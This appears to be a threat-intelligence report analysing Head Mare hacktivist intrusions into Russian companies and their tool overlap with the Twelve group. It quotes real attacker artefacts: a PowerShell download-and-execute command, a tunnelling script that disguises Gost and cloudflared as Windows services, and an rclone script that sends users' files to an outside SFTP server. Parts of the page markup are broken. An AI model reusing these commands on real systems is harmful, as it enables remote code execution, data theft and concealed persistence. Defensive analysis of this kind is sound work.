											<div class="js-reading-content">
												<div class="c-wysiwyg">
													<h2 id="introduction">Introduction</h2>
<p>In September 2024, a series of attacks targeted Russian companies, revealing indicators of compromise and tactics associated with two hacktivist groups: <a href="https://securelist.com/head-mare-hacktivists/113555/" target="_blank" rel="noopener">Head Mare</a> and <a href="https://securelist.com/twelve-group-unified-kill-chain/113877/" target="_blank" rel="noopener">Twelve</a>. Our investigation showed that Head Mare relied heavily on tools previously associated with Twelve. Additionally, Head Mare attacks utilized command-and-control (C2) servers exclusively linked to Twelve prior to these incidents. This suggests potential collaboration and joint campaigns between the two groups.</p>
<p>The attackers continue to refine their methods, employing both familiar tools from past Head Mare incidents and new PowerShell-based tools.</p>
<p>This report analyzes the software and techniques observed in recent Head Mare attacks and how these overlap with Twelve&#8217;s activities. The focus is on Head Mare&#8217;s TTPs and their evolution, with notes on commonalities with Twelve&#8217;s TTPs.</p>
<h2 id="technical-details">Technical details</h2>
<h3 id="head-mares-toolkit">Head Mare&#8217;s toolkit</h3>
<p>The attackers used various publicly available tools, including open-source software and leaked proprietary tools, to achieve their goals.</p>
<ul>
<li>mimikatz;</li>
<li>ADRecon;</li>
<li>secretsdump;</li>
<li>ProcDump;</li>
<li>Localtonet;</li>
<li>revsocks;</li>
<li>ngrok;</li>
<li>cloudflared;</li>
<li>Gost;</li>
<li>fscan;</li>
<li>SoftPerfect Network Scanner;</li>
<li>mRemoteNG;</li>
<li>PSExec;</li>
<li>smbexec;</li>
<li>wmiexec;</li>
<li>LockBit 3.0;</li>
<li>Babuk.</li>
</ul>
<p>Some of these tools were mentioned in our previous <a href="https://securelist.com/head-mare-hacktivists/113555/" target="_blank" rel="noopener">report</a> on Head Mare, while others were new to their arsenal.</p>
<h3 id="notable-new-tools">Notable new tools</h3>
<p>Among the tools used by Head Mare were some not previously employed by the hacktivists but seen in attacks by other groups. For instance, they used the <strong>CobInt</strong> backdoor for remote access to domain controllers, previously observed only in Twelve&#8217;s attacks on Russian companies. This is an interesting fact, suggesting that Twelve and Head Mare may be sharing tools.</p>
<p>In addition to <strong>CobInt</strong>, the attackers used their own <strong>PhantomJitter</strong> backdoor, installed on servers for remote command execution. This tool appeared in the group&#8217;s arsenal in August 2024. We described its modus operandi in a story accessible to the subscribers of our <a href="https://www.kaspersky.com/enterprise-security/threat-intelligence?icid=gl_securelist_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______c41a63524a629091" target="_blank" rel="noopener">Threat Intelligence</a> reports.</p>
<p>Another new tactic involved a tool for remote command execution on a business automation platform server. Thus, the attackers used both proven and new tools, demonstrating flexibility and adaptability.</p>
<h3 id="initial-access">Initial Access</h3>
<p>While previous Head Mare attacks relied solely on phishing emails with malicious attachments, they now also infiltrate victims&#8217; infrastructure through compromised contractors with access to business automation platforms and RDP connections. This confirms the trend of hacktivists <a href="https://securelist.com/trusted-relationship-attack/112731/" target="_blank" rel="noopener">exploiting trusted relationships</a> (T1199  –  Trusted Relationship and T1078  –  Valid Accounts).</p>
<p>The attackers also exploited software vulnerabilities, most commonly <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38831" target="_blank" rel="noopener">CVE-2023-38831</a> in WinRAR through phishing emails. In one incident, they exploited the Microsoft Exchange server vulnerability <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26855" target="_blank" rel="noopener">CVE-2021-26855</a> (ProxyLogon). Although patched in 2021, this vulnerability is still exploitable due to organizations using outdated operating systems and software. Our telemetry data revealed domain controllers still running Microsoft Windows Server 2012 R2 Server Standard x64 or, as in the aforementioned incidents, Microsoft Exchange Server 2016 used for email.</p>
<p>The attackers used ProxyLogon to execute a command to download and launch <strong>CobInt</strong> on the server.</p>
<h3 id="persistence">Persistence</h3>
<p>The method of establishing persistence has changed. Instead of creating scheduled tasks, the attackers now create new privileged local users on a business automation platform server. They use these accounts to connect to the server via <strong>RDP</strong> to transfer and execute tools interactively.</p>
<p>They also install traffic tunneling tools like <strong>Localtonet</strong> for persistent access to the target host. They made Localtonet persistent with the help of <strong>Non-Sucking Service Manager (NSSM)</strong>, which allows running any application as a Windows service, as well as monitoring and restarting it if it fails for some reason. This user-friendly tool is often used legitimately to install and manage programs that cannot function as services. Localtonet and NSSM help the malicious actor to maintain continuous access to the infected host.</p>
<h3 id="anti-detection-techniques">Anti-detection techniques</h3>
<p>Head Mare continued to use the Masquerading technique (T1655), naming utility executables like standard operating system files. The investigation found files such as:</p>
<table width="100%">
<tbody>
<tr>
<td width="50%"><strong>Software</strong></td>
<td width="50%"><strong>Path in the system</strong></td>
</tr>
<tr>
<td>Cloud storages sync tool rclone</td>
<td>C:\ProgramData\wusa.exe</td>
</tr>
<tr>
<td>PhantomJitter</td>
<td>C:\Windows\System32\inetsrv\calc.exe</td>
</tr>
<tr>
<td>cloudflared</td>
<td>C:\Windows\System32\winuac.exe</td>
</tr>
<tr>
<td>Gost</td>
<td>C:\Windows\System32\winsw.exe</td>
</tr>
</tbody>
</table>
<p>In one incident, cmd.exe was renamed to log.exe and launched from C:\Users\[username]\log.exe.</p>
<p>Besides renaming files, the attackers also removed services and files they had created and cleared event logs to evade detection. Relevant artifacts were found in the PowerShell command history on attacked machines:</p>

The ransomware executable also cleared system logs, as evidenced by a flag in the configuration of the samples that we have analyzed.</p>
<h3 id="command-and-control">Command and Control</h3>
<p>After exploiting the business automation platform server, attackers downloaded and installed the PhantomJitter backdoor. In the incidents we observed, the backdoor was downloaded into the victims&#8217; infrastructure from the following URLs:</p>

The domain resolves to the IP address 45.156.27[.]115.</p>
<h3 id="pivoting">Pivoting</h3>
<p>The group expanded its arsenal to achieve their objectives at this stage. To gain remote access to the compromised infrastructure, they used a custom PowerShell script named proxy.ps1 to install and configure cloudflared and Gost.</p>
<p><strong>Gost</strong> is a lightweight, powerful proxy utility offering various network routing and traffic hiding capabilities. It supports multiple protocols and can create secure communication channels, bypass blocks, and establish tunnels.</p>
<p><strong>Cloudflared</strong> tunnels traffic through the Cloudflare network. It establishes a secure connection to an attacker-controlled Cloudflare server, acting as a proxy for C2 communication. This bypasses network restrictions like NAT (Network Address Translation) and firewall rules that might hinder direct connections between the victim host and attacker servers.</p>
<p>The proxy.ps1 script can also download archives from URLs specified on a command line and extract them to a temporary folder. Below is the help output for the script:</p>
		<div id="crayon-67d58a2fbf7d6304765251" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
Usage: .\proxy.ps1 -r https://&lt;site&gt;.com/archive.zip -p gost_port -t cloudflared_token 

Parameters:
  -l       Extract archive locally.
  -r       Download and extract archive remotely.
  -p       Specify the port for the gost.
  -t       Specify the token for the cloudflared.
  -u       Uninstall gost &amp; cloudflared.
  -h       Show this help message.</textarea></div>

		</div><p>
The script defines constants for filenames, installing cloudflared and Gost with names mimicking standard Windows services in the C:\Windows\System32 folder. The script uses the GetTempFileName function to obtain temporary file paths.</p>
		<div id="crayon-67d58a2fbf7d7143795602" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>

			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$archivePath = "win.zip"
$filesPath = "C:\Windows\System32"
$cloudflaredPath = Join-Path -Path $filesPath -ChildPath "winuac.exe"
$gostPath = Join-Path -Path $filesPath -ChildPath "winsw.exe"
$winswPath = Join-Path -Path $filesPath -ChildPath "winsws.exe"
$winswxmlPath = Join-Path -Path $filesPath -ChildPath "winsws.xml"
$tempFile = [System.IO.Path]::GetTempFileName()</textarea></div>

		</div><p>
If the -p flag is specified in the command line, a service for the Gost tool will be installed on the system. The following function is used for this:</p>
		<div id="crayon-67d58a2fbf7d8285991377" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function Setup-Gost-Service {
    # Set port
    [xml]$winswxml = Get-Content $winswxmlPath
    $winswxml.service.arguments = $winswxml.service.arguments -replace '42716', $p
    $winswxml.Save($winswxmlPath)
    Write-Host "[*] Port number updated to $port in $winswxmlPath"

    # Service install
    Write-Host "[*] Installing gost as service"
    Start-Process $winswPath -ArgumentList "install" -RedirectStandardOutput $tempFile -NoNewWindow -Wait
    $output = Get-Content $tempFile
    Write-Output $output
    Start-Process $winswPath -ArgumentList "start" -RedirectStandardOutput $tempFile -NoNewWindow -Wait
    $output = Get-Content $tempFile
    Write-Output $output
}</textarea></div>

		</div><p>
In this code snippet, the script installs the Gost executable file as a service and passes necessary settings to it.</p>
<p>If -t key is passed to the script, it installs and configures cloudflared in the system.</p>
		<div id="crayon-67d58a2fbf7da265904869" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">

			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function Setup-Cloudflared-Service {

    # Service install
    Write-Host "[*] Installing cloudflared as service"
    Start-Process $cloudflaredPath -ArgumentList "service install $t" -RedirectStandardError $tempFile -NoNewWindow -Wait
    $output = Get-Content $tempFile
    Write-Output $output
}</textarea></div>

		</div><p>
In this code snippet, the script installs the cloudflared service and passes settings to it by means of the command line.</p>
<p>In addition to installing and configuring tunneling tools, the script has the ability to remove the artifacts they leave behind. The script can also stop and uninstall the cloudflared and Gost services, if the -u parameter is passed to it when it launches.</p>
		<div id="crayon-67d58a2fbf7db710418835" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
if ($u) {
    Write-Host "[*] Uninstalling gost"
    Start-Process sc.exe -ArgumentList "stop winsw" -RedirectStandardOutput $tempFile -NoNewWindow -Wait
    $output = Get-Content $tempFile
    Write-Output $output
    Start-Process $winswPath -ArgumentList "uninstall" -RedirectStandardOutput $tempFile -NoNewWindow -Wait
    $output = Get-Content $tempFile
    Write-Output $output

    Write-Host "[*] Uninstalling cloudflared"
    Start-Process sc.exe -ArgumentList "stop winuac" -RedirectStandardOutput $tempFile -NoNewWindow -Wait
    $output = Get-Content $tempFile
    Write-Output $output
    Start-Process $cloudflaredPath -ArgumentList "service uninstall" -RedirectStandardError $tempFile -NoNewWindow -Wait
    $output = Get-Content $tempFile
    Write-Output $output

    $filePaths = @(
    "C:\Windows\System32\winsws.wrapper.log",
    "C:\Windows\System32\winsws.err.log",
    "C:\Windows\System32\winsws.out.log",
    "C:\Windows\System32\winsws.xml",
    "C:\Windows\System32\winsws.exe",
    "C:\Windows\System32\winsw.exe",
    "C:\Windows\System32\winuac.exe"
    )
    foreach ($filePath in $filePaths) {
    if (Test-Path $filePath) {
        Remove-Item -Path $filePath -Force
        Write-Output "[*] Deleted: $filePath"
    } else {
        Write-Output "[*] File not found: $filePath"
    }
    }
}</textarea></div>

After deleting the services, the script deletes executables, configuration files, and logs of the tools.</p>

Besides cloudflared and Gost, the attackers used cloud tunnels like ngrok and Localtonet. <strong>Localtonet</strong> is a reverse proxy server providing internet access to local services. The attackers launched it as a service using NSSM, downloading both tools from the official Localtonet website (localtonet[.]com).</p>

These commands allow installing Localtonet as a service and authorizing it with a token for configuration.</p>
<h3 id="reconnaissance">Reconnaissance</h3>
<p>The attackers used common system reconnaissance tools like quser.exe, tasklist.exe, and netstat.exe on local hosts. They primarily used fscan and SoftPerfect Network Scanner for local network reconnaissance, along with ADRecon, a tool for gathering information from Active Directory. ADRecon is a PowerShell script not previously observed in the group&#8217;s arsenal.</p>
<p>The attackers also used ADRecon to study the Active Directory domain, including computers, accounts, groups, and trust relationships between domains. The command history showed various domains passed as arguments to the script:</p>
		<div id="crayon-67d58a2fbf7e0447410794" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
.\ADRecon.ps1 -DomainController &lt;FQDN A&gt;
.\ADRecon.ps1 -DomainController &lt;FQDN B&gt;
.\ADRecon.ps1 -DomainController &lt;FQDN C&gt;
&lt;..&gt;</textarea></div>

				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-67d58a2fbf7e0447410794-1"><span class="crayon-sy">.</span><span class="crayon-sy">\</span><span class="crayon-i">ADRecon</span><span class="crayon-sy">.</span><span class="crayon-i">ps1</span><span class="crayon-h"> </span>-<span class="crayon-i">DomainController</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-i">FQDN</span><span class="crayon-h"> </span><span class="crayon-i">A</span><span class="crayon-h">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d58a2fbf7e0447410794-2"><span class="crayon-sy">.</span><span class="crayon-sy">\</span><span class="crayon-i">ADRecon</span><span class="crayon-sy">.</span><span class="crayon-i">ps1</span><span class="crayon-h"> </span>-<span class="crayon-i">DomainController</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-i">FQDN</span><span class="crayon-h"> </span><span class="crayon-i">B</span><span class="crayon-h">&gt;</span></div><div class="crayon-line" id="crayon-67d58a2fbf7e0447410794-3"><span class="crayon-sy">.</span><span class="crayon-sy">\</span><span class="crayon-i">ADRecon</span><span class="crayon-sy">.</span><span class="crayon-i">ps1</span><span class="crayon-h"> </span>-<span class="crayon-i">DomainController</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-i">FQDN</span><span class="crayon-h"> </span><span class="crayon-i">C</span><span class="crayon-h">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d58a2fbf7e0447410794-4"><span class="crayon-h">&lt;</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-h">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
<h3 id="privilege-escalation">Privilege Escalation</h3>
<p>The attackers exploited previously compromised accounts of victims and their contractors, and created privileged local accounts, particularly when exploiting the business automation software server. If a user has sufficient permissions to remotely execute commands on the server, this software allows running a child command prompt process, such as cmd.exe, with privileges in the operating system corresponding to the program&#8217;s privileges. Since business automation software typically has administrator privileges in the OS, the child process also becomes privileged. The attackers exploited this opportunity: after gaining access to the vulnerable software server, they created a privileged local account on whose behalf they launched a command interpreter.</p>
<h3 id="command-execution">Command Execution</h3>
<p>The attackers launched the Windows command interpreter on the business automation platform server in the target system within a process that executed the following command line:</p>
		<div id="crayon-67d58a2fbf7e1028300417" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">

cmd /c powershell.exe -ep bypass -w hidden -c iex ((New-Object 
Net.WebClient).DownloadString('http://web-telegram[.]uk/vivo.txt')) &gt; $temp\v8_B5B0_11.txt</textarea></div>

Then, using reg.exe, the attackers added an autorun entry to execute mcdrive.vbs with the interpreter wscript.exe.</p>

The VBS file is an obfuscated Visual Basic script that creates an ActiveX object reference named WScript.Shell and uses its Run() function to execute an obfuscated command line.</p>
<p>A deobfuscated command line snippet follows:</p>
		<div id="crayon-67d58a2fbf7e5915364115" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">

%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -ex bypass -NoLogo -
NonInteractive -NoProfile -w hidden -c iex 
([System.IO.File]::ReadAllText('C:\ProgramData\MicrosoftDrive\mcdrive.ps1'))</textarea></div>

					</tr>
				</table>
			</div>
		</div><p>
This command reads and executes the C:\ProgramData\MicrosoftDrive\mcdrive.ps1 file through the PowerShell interpreter. This file is a <strong>CobInt</strong> loader, previously seen only in Twelve&#8217;s arsenal. The mcdrive.ps1 snippet below determines the operating system&#8217;s bitness, decrypts, and executes the payload, which initiates a request to a C2 server at 360nvidia[.]com. The image below shows a graph obtained from analysis in the Cloud Sandbox on our Threat Intelligence Portal.</p>
<div id="attachment_115891" style="width: 1013px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/11131143/Head_Mare__Twelve_01.png" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-115891" class="size-full wp-image-115891" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/11131143/Head_Mare__Twelve_01.png" alt="Payload execution analysis graph. <h3 id="credential-access">Credential Access</h3>

<h3 id="lateral-movement">Lateral Movement</h3>
<p>The attackers used RDP to connect to systems, including with privileged accounts. They connected to NAS servers via SSH and used tools like mRemoteNG, smbexec, wmiexec, PAExec, and PsExec for remote host communication.</p>
<h3 id="data-collection-and-exfiltration">Data Collection and Exfiltration</h3>
<p>Another new tool in Head Mare&#8217;s arsenal was a script running wusa.exe. Normally, this file name is used by the legitimate Windows update process. However, the script&#8217;s launch parameters indicated that the file was actually the rclone.exe utility. Rclone is an open-source project for copying and synchronizing files between storages of different types, making it convenient for data transfer.</p>
		<div id="crayon-67d58a2fbf7eb156571245" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
@echo off
setlocal enabledelayedexpansion
set inputFile=C:\ProgramData\1.txt
for /f "tokens=*" %%A in (%inputFile%) do (
    set hostname=%%A
    start /wait "" C:\ProgramData\wusa.exe --config="C:\ProgramData\1.conf" --sftp-socks-proxy &lt;username&gt;:&lt;password&gt;@64.7.198.109:80 sync "\\%%A\C$\Users" sftpP:/data/&lt;path&gt; -q --ignore-existing --auto-confirm --include "*.doc" --include "*.docx" --include "*Desktop/**" --include "*Documents/**" --include "*Downloads/**" --include "*.pdf" --include "*.xls" --include "*.xlsx" --include "*.zip" --include "*.rar" --include "*.txt" --include "*.pn*" --include "*.ppt" --include "*.pptx" --include "*.jp*" --include "*.eml" --include "*.pst" --multi-thread-streams 12 --transfers 12 --max-age 3y --max-size 1G
)
endlocal</textarea></div>

				<table class="crayon-table">
					<tr class="crayon-row">

				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-i">multi</span>-<span class="crayon-i">thread</span>-<span class="crayon-i">streams</span><span class="crayon-h"> </span><span class="crayon-cn">12</span><span class="crayon-h"> </span>--<span class="crayon-i">transfers</span><span class="crayon-h"> </span><span class="crayon-cn">12</span><span class="crayon-h"> </span>--<span class="crayon-i">max</span>-<span class="crayon-i">age</span><span class="crayon-h"> </span><span class="crayon-cn">3y</span><span class="crayon-h"> </span>--<span class="crayon-i">max</span>-<span class="crayon-i">size</span><span class="crayon-h"> </span><span class="crayon-cn">1G</span></div><div class="crayon-line" id="crayon-67d58a2fbf7eb156571245-7"><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d58a2fbf7eb156571245-8"><span class="crayon-i">endlocal</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
The script starts by taking the file 1.txt as input, which contains a list of hosts. For each host, it runs rclone.exe to transfer files from the device to an SFTP server through a SOCKS proxy. The attackers only exfiltrated files from specific directories or files matching the extension templates specified in the script.</p>
<h3 id="final-goal-file-encryption">Final goal: file encryption</h3>
<p>As in <a href="https://securelist.com/head-mare-hacktivists/113555/" target="_blank" rel="noopener">previous attacks</a>, they encrypted data using variants of LockBit 3.0 (for Windows systems) and Babuk (for NAS devices). The investigation found that the LockBit file was initially saved on the victim&#8217;s host at the following paths:</p>
<ul>
<li>C:\Users\{username}\Desktop\locker.exe;</li>
<li>С:\Windows\SYSVOL\Intel\locker.exe.</li>
</ul>
<p>Below is a sample ransom note, with the cybercriminals&#8217; contacts redacted:</p>
<div id="attachment_115892" style="width: 692px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/11131429/Head_Mare__Twelve_02.png" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-115892" class="size-full wp-image-115892" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/11131429/Head_Mare__Twelve_02.png" alt="Contents of a LockBit ransom note" width="682" height="181" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/11131429/Head_Mare__Twelve_02.png 682w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/11131429/Head_Mare__Twelve_02-300x80.png 300w" sizes="auto, (max-width: 682px) 100vw, 682px" /></a><p id="caption-attachment-115892" class="wp-caption-text">Contents of a LockBit ransom note</p></div>
<h3 id="connection-between-head-mare-and-twelve">Connection between Head Mare and Twelve</h3>
<p>In addition to the aforementioned TTPs, we attribute these attacks to Head Mare based on the following characteristics:</p>
<ol>
<li>A previously seen IP address:
<ul>
<li>45.156.21[.]148</li>
</ul>
</li>
<li>Malware:
<ul>
<li>PhantomJitter</li>
</ul>
</li>
</ol>
<p>Further details about these indicators can be found in the private report on the Threat Intelligence Portal: &#8220;HeadMare&#8217;s new PhantomJitter backdoor dropped in attacks exploiting Microsoft Exchange&#8221;.</p>
<p>However, the presence of Twelve&#8217;s tools like CobInt suggests collaboration. To test this hypothesis, activity cluster diagrams were created based on <a href="https://www.eccouncil.org/cybersecurity-exchange/ethical-hacking/diamond-model-intrusion-analysis/" target="_blank" rel="noopener">the Diamond Model framework</a>. Overlaps – common elements in the tactics of both groups – are highlighted in red, indicating potential coordination.</p>
<div id="attachment_115901" style="width: 633px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/13092741/Head_Mare_twelve_03_en.jpg" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-115901" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/13092741/Head_Mare_twelve_03_en.jpg" alt="Analysis of the Head Mare techniques and tools" width="623" height="260" class="size-full wp-image-115901" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/13092741/Head_Mare_twelve_03_en.jpg 623w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/13092741/Head_Mare_twelve_03_en-300x125.jpg 300w" sizes="auto, (max-width: 623px) 100vw, 623px" /></a><p id="caption-attachment-115901" class="wp-caption-text">Analysis of the Head Mare techniques and tools</p></div>
